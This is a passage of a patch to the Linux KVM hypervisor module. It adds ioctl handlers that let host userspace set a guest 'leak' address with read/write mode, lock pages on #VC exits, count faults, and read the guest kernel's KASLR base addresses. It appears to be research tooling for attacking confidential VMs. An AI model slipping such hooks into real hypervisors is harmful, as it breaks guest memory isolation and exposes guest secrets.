++	user_data_npf_ex.block_on_page = true;
++	return 0;
++}
++
++static long unlock_write_mov_page(void){
++	user_data_npf_ex.block_on_page = false;
++	if (user_data_npf_ex.state == VC_BLOCK_ON_MOV){
++		user_data_npf_ex.state = VC_IDLE;
++	}
++	return 0;
++}
++
++static long handle_set_stuff(unsigned long arg){
++	void __user *argp = (void __user *)arg;
++
++	struct kvm_vc_leak __user *user_leak_vc_struct = argp;
++	struct kvm_vc_leak leak_vc_struct;
++
++	if (copy_from_user(&leak_vc_struct, user_leak_vc_struct, sizeof(leak_vc_struct)))
++		return -EFAULT;
++	
++	if( (user_data_npf_ex.state != VC_IDLE && user_data_npf_ex.state != VC_BLOCK_ON_MOV) || user_data_npf_ex.start == true){
++		return -EFAULT;
++	}
++
++	user_data_npf_ex.leak_addr = leak_vc_struct.leak_addr;
++	user_data_npf_ex.data_user = leak_vc_struct.leak_data;
++	user_data_npf_ex.do_read = leak_vc_struct.read;
++	user_data_npf_ex.start = true;
++
++	return 0;
++}
++
++static long handle_get_stuff(unsigned long arg){
++	void __user *argp = (void __user *)arg;
++	struct kvm_vc_leak __user *user_leak_vc_struct = argp;
++	struct kvm_vc_leak leak_vc_struct;
++	
++	if( (user_data_npf_ex.state != VC_IDLE && user_data_npf_ex.state != VC_BLOCK_ON_MOV) || user_data_npf_ex.start == true){
++		return -EBUSY;
++	}
++	//pr_info("user_data_npf_ex state 0x%x",user_data_npf_ex.state);
++	//pr_info("user_data_npf_ex data_user 0x%llx",user_data_npf_ex.data_user);
++	leak_vc_struct.leak_addr = user_data_npf_ex.leak_addr;
++	leak_vc_struct.leak_data = user_data_npf_ex.data_user;
++	leak_vc_struct.read = user_data_npf_ex.do_read;
++	if (copy_to_user(user_leak_vc_struct, &leak_vc_struct, sizeof(leak_vc_struct)))
++		return -EFAULT;
++
++	return 0;
++}
++
++static long handle_vc_get_kaslr(unsigned long arg){
++	void __user *argp = (void __user *)arg;
++	struct kvm_vc_leak __user *user_leak_vc_struct = argp;
++	struct kvm_vc_leak leak_vc_struct;
++	
++	leak_vc_struct.virtual_kaslr_base = user_data_npf_ex.virtual_base_addr_kernel;
++	leak_vc_struct.physcial_kaslr_base = user_data_npf_ex.physical_base_addr_kernel;
++	if (copy_to_user(user_leak_vc_struct, &leak_vc_struct, sizeof(leak_vc_struct)))
++		return -EFAULT;
++
++	__flush_tlb_all();
++	return 0;
++} 
++
++static long set_pf_count(void){
++	user_data_npf_ex.generic_page_fault_counter = 0;
++	return 0;
++}
++
++static long get_pf_count(void){
++	return user_data_npf_ex.generic_page_fault_counter;
++}
++
+ static long kvm_dev_ioctl(struct file *filp,
+ 			  unsigned int ioctl, unsigned long arg)
+ {
+@@ -5402,6 +5524,26 @@ static long kvm_dev_ioctl(struct file *filp,
+ 	case KVM_TRACE_DISABLE:
+ 		r = -EOPNOTSUPP;
+ 		break;
++	case KVM_VC_SET_STUFF:
++		return handle_set_stuff(arg);
++		break;
++	case KVM_VC_GET_STUFF:
++		return handle_get_stuff(arg);
++	case KVM_VC_GET_KASLR:
++		return handle_vc_get_kaslr(arg);
++	case KVM_VC_WRITE_LOCK:
++		return lock_write_mov_page();
++	case KVM_VC_WRITE_UNLOCK:
++		return unlock_write_mov_page();
++	case KVM_VC_GET_PF_CNT:
++		return get_pf_count();
++	case KVM_VC_SET_PF_CNT:
++		return set_pf_count();
++	case KVM_VC_GET_VC_CNT:
++		return user_data_npf_ex.generic_vc_counter;
++	case KVM_VC_SET_VC_CNT:
++		user_data_npf_ex.generic_vc_counter = 0;
++		return 0;
+ 	default:
+ 		return kvm_arch_dev_ioctl(filp, ioctl, arg);
+ 	}
